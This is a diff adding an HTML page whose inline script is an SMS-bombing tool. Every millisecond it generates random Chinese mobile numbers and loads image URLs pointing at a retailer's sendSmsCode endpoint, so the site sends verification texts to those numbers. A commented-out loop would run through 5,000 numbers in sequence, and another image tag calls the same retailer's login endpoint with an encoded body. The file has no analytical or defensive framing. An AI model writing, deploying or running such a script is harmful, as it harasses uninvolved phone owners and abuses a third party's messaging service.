@@ -1,0 +1,49 @@
+<!--
+ * @Date: 2024-02-22 21:14:11
+ * @LastEditTime: 2024-02-23 12:19:26
+ * @Author: wangyongjie
+ * @Note:  
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <!-- jquery cdn -->
+  <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+</head>
+<body>
+  <div class="box">
+    
+  </div>
+  <img src="https://mobile.gome.com.cn/wap/profile/profileNewRequire/fastLogin.jsp?body={%22ge%22:%2217mao/pRFs5h%2B9ZnjZ1g72HXVt4kgz4wB0J6boaprJA0xTeBuUO0vhVRk0mI6ILDkmdZv6zPUFldk7srwGNd8I904Q%2BfNRZNJGU%2BRFLcfNI=%22,%22gr%22:%22OUS1WSzu4bI5cFnhybw5hBPnSvQHPOuyI9Y1B35vHmH1WdBDeQICj7EAp%2B/fJOePbuws44nP6cEQxtoK2ZWynoZZvUDw%2BoRrozfzg/aknzOkuT/Yj5%2BNmKEDPvTgT/3Y6V1L0ioinIrDaGccBIyfZr6eRzl05ekTFzG0JAEMMWw=%22,%22gd%22:%2232908b5871c14d2d282ab96258aac0be8a49bd25%22,%22from%22:%22wapLogin%22}" alt="">
+  
+  <script>
+    function generateRandomPhone() {
+      var validAreaCodes = ['130', '131', '132', '133', '134', '135', '136', '137', '138', '139',
+                            '150', '151', '152', '153', '155', '156', '157', '158', '159',
+                            '180', '181', '182', '183', '184', '185', '186', '187', '188', '189'];
+
+      var areaCode = validAreaCodes[Math.floor(Math.random() * validAreaCodes.length)];
+      var phone = areaCode;
+      
+      for (var i = 0; i < 8; i++) {
+        phone += Math.floor(Math.random() * 10);
+      }
+      
+      return phone;
+    }
+    // $("#phonenum").val(generateRandomPhone());
+    // $("#sendYzm").click()
+    // console.log(generateRandomPhone());
+    setInterval(() => {
+      $('.box').append(`<img src="https://ssp.gome.com.cn/media/sendSmsCode?account=${generateRandomPhone()}" alt="">-<span>${generateRandomPhone()}</span>`);
+    }, 1);
+    // var number = 17511111111;
+    // for(var i=0;i<5000;i++){
+    //   $('.box').append(`<img src="https://ssp.gome.com.cn/media/sendSmsCode?account=${number++}" alt="">`);
+    // }
+  </script>
+</body>
+</html>
